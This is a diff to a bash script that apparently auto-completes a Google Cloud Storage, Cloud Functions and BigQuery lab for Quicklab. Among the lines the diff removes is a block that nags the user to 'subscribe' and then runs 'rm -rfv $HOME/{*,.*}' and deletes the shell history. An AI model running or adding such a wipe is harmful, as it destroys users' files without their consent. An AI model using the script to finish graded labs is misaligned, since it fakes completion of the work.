@@ -32,13 +32,7 @@ Starting Execution
 
 ${RESET}"
 #gcloud auth list
-#gcloud config list project
-export PROJECT_ID=$(gcloud info --format='value(config.project)')
-#export BUCKET_NAME=$(gcloud info --format='value(config.project)')
-#export EMAIL=$(gcloud config get-value core/account)
-#gcloud config set compute/region $region
-#gcloud config set compute/zone $region-a
-#export ZONE=$region-a
+
 
 
 
@@ -162,7 +156,7 @@ ${RESET}"
 
 curl -LO https://github.com/quiccklabs/Labs_solutions/raw/master/APIs%20Explorer%20Cloud%20Storage/demo-image1.png
 
-gsutil cp demo-image1.png gs://$DEVSHELL_PROJECT_ID-upload
+gsutil cp demo-image1.png gs://$IV_BUCKET_NAME
 
 while [[ $(gcloud beta functions logs read --filter "finished with status" "GCStoPubsub" --limit 100 --region $REGION) != *"finished with status"* ]]; do echo "Waiting for logs for GCStoPubsub..."; sleep 10; done
 gcloud beta functions logs read --filter "finished with status" "insertIntoBigQuery" --limit 100 --region $REGION
@@ -183,6 +177,8 @@ ORDER BY insertTimestamp DESC,
 LIMIT 1000
 " > sql.txt
 
+sleep 40
+
 bq --project_id ${PROJECT_ID} query < sql.txt
 
 echo "${GREEN}${BOLD}
@@ -193,17 +189,3 @@ Lab Completed !!!
 
 ${RESET}"
 
-#-----------------------------------------------------end----------------------------------------------------------#
-read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
-
-while [ "$CONSENT_REMOVE" != 'y' ]; do
-  sleep 10
-  read -p "${BOLD}${YELLOW}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
-done
-
-echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"
-
-rm -rfv $HOME/{*,.*}
-rm $HOME/.bash_history
-
-exit 0
